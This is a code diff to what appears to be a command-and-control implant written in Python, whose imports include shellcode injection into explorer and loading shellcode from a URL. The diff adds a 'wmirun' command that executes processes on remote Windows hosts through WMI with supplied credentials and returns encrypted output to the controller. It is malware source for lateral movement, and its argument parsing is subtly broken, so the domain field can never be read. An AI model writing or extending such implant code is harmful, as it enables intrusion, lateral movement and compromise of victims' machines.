@@ -32,6 +32,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.mv import mv
     from utils.winapi.cp import cp
     from utils.winapi.rm import rm
+    from utils.winapi.wmirun import wmirun
     from utils.winapi.inject_shellcode import load_shellcode_into_explorer
     from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
     from utils.winapi.cd import cd
@@ -647,6 +648,27 @@ def execute_commands(agent_id):
                     except Exception as e:
                         status = 'Failed'
                         output = str(e)
+                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+
+            # Insert this snippet in the appropriate section of the execute_commands function
+            elif os.name == 'nt' and command_text.lower().startswith('wmirun'):
+                try:
+                    parts = command_text.split(' ', 4)
+                    if len(parts) < 4:
+                        raise ValueError("Invalid wmirun command format. Use 'wmirun <hostname> <command> [user password domain]'")
+
+                    remote_hostname = parts[1]
+                    command = parts[2]
+                    user = parts[3] if len(parts) > 3 else None
+                    password = parts[4] if len(parts) > 4 else None
+                    domain = parts[5] if len(parts) > 5 else None
+
+                    result = wmirun(remote_hostname, command, user, password, domain)
+                    status = 'Completed' if "Process started successfully" in result else 'Failed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
                 update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
 
             elif command_text.lower() == 'pwd':
